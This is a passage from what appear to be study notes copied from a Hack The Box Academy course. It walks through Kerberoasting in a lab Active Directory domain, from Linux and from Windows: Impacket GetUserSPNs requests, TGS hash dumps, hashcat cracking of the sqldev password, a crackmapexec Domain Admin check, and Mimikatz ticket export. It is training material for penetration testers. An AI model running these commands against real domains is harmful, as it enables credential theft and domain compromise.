17:10:06.545598  <never>               \nMSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               \nadfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>               \n\n\n\n$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d\n$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30\n\n<SNIP>\n```\n\nWe can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.\n\n#### Requesting a Single TGS ticket\n\nKerberoasting - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev\n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------\nMSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>               \n\n\n\n$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2\n```\n\nWith this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.\n\nTo facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.\n\n#### Saving the TGS Ticket to an Output File\n\nKerberoasting - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs\n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------\nMSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>  \n```\n\nHere we've written the TGS ticket for the `sqldev` user to a file named `sqldev_tgs`. Now we can attempt to crack the ticket offline using Hashcat hash mode `13100`.\n\n#### Cracking the Ticket Offline with Hashcat\n\nKerberoasting - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n<SNIP>\n\n$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f:database!\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5, etype 23, TGS-REP\nHash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f\nTime.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)\nTime.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 8765440/14344386 (61.11%)\nRejected.........: 0/8765440 (0.00%)\nRestore.Point....: 8749056/14344386 (60.99%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: davius07 -> darten170\n\nStarted: Tue Feb 15 17:44:49 2022\nStopped: Tue Feb 15 17:45:41 2022\n```\n\n![GIF showcasing the usage of hashcat to crack the obtained hash.](https://academy.hackthebox.com/storage/modules/143/hashcat_tgs.png)\n\nWe've successfully cracked the user's password as `database!`. As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.\n\n#### Testing Authentication against a Domain Controller\n\nKerberoasting - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\sqldev:database! (Pwn3d!\n```\n\n---\n\n## More Roasting\n\nNow that we've covered Kerberoasting from a Linux attack host, we'll go through the process from a Windows host. We may decide to perform part, or all, of our testing from a Windows host, our client may provide us with a Windows host to test from, or we may compromise a host and need to use it as a jump-off point for further attacks. Regardless of how we are using Windows hosts during our assessments, to remain versatile, it is essential to understand how to perform as many attacks as possible from both Linux and Windows hosts, because we never know what we will have thrown at us from one assessment to another.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/19- Kerberoasting - from Windows",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/19- Kerberoasting - from Windows.md",
    "title": "19  Kerberoasting   From Windows",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Kerberoasting - Semi Manual method Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform ...",
    "category": "02_CPTS",
    "content": "## Kerberoasting - Semi Manual method\n\nBefore tools such as `Rubeus` existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\\(v=ws.11\\)) binary to enumerate SPNs in the domain.\n\n#### Enumerating SPNs with setspn.exe\n\nKerberoasting - from Windows\n\n```cmd-session\nC:\\htb> setspn.exe -Q */*\n\nChecking domain DC=INLANEFREIGHT,DC=LOCAL\nCN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL\n        exchangeAB/ACADEMY-EA-DC01\n        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n        TERMSRV/ACADEMY-EA-DC01\n        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL\n        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL\n\n<SNIP>\n\nCN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n        backupjob/veam001.inlanefreight.local\nCN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n        sts/inlanefreight.local\n\n<SNIP>\n\nCN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n        MSSQLSvc/SPSJDB.inlanefreight.local:1433\nCN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351\nCN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\nCN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n        adfsconnect/azure01.inlanefreight.local\n\nExisting SPN found!\n```\n\nWe will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`. Let's try this by targeting a single user:\n\n#### Targeting a Single User\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> Add-Type -AssemblyName System.IdentityModel\nPS C:\\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"\n\nId                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2\nSecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom            : 2/24/2022 11:36:22 PM\nValidTo              : 2/25/2022 8:55:25 AM\nServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\nSecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n```\n\nBefore moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):\n\n- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object\n- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using\n- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services\n- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object\n- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session\n\nWe can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.\n\n#### Retrieving All Tickets Using setspn.exe\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n\nId                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3\nSecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom            : 2/24/2022 11:56:18 PM\nValidTo              : 2/25/2022 8:55:25 AM\nServicePrincipalName : exchangeAB/ACADEMY-EA-DC01\nSecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n\nId                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4\nSecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom            : 2/24/2022 11:56:18 PM\nValidTo              : 2/24/2022 11:58:18 PM\nServicePrincipalName : kadmin/changepw\nSecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n\nId                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5\nSecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom            : 2/24/2022 11:56:18 PM\nValidTo              : 2/25/2022 8:55:25 AM\nServicePrincipalName : WSMAN/ACADEMY-EA-MS01\nSecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n\n<SNIP>\n```\n\nThe above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.\n\nNow that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.\n\n## Extracting Tickets from Memory with Mimikatz\n\nKerberoasting - from Windows\n```\n.\\mimikatz.exe \"log mimikatz.log\" \"privilege::debug\" \"base64 /out:true\" \"kerberos::list /export\" exit\n```\n\n```cmd-session\nUsing 'mimikatz.log' for logfile : OK\n\nmimikatz # base64 /out:true\nisBase64InterceptInput  is false\nisBase64InterceptOutput is true\n\nmimikatz # kerberos::list /export  \n\n<SNIP>\n\n[00000002] - 0x00000017 - rc4_hmac_nt      \n   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM\n   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL\n   Client Name       : htb-student @ INLANEFREIGHT.LOCAL\n   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; \n====================\nBase64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi\n====================\n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\nZWZyZWlnaHQubG9jYWw6MTQzMw==\n====================\n\n   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi\n\n<SNIP>\n```\n\nIf we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.\n\nNext, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.\n\n#### Preparing the Base64 Blob for Cracking\n\nKerberoasting - from Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo \"<base64 blob>\" |  tr -d \\\\n 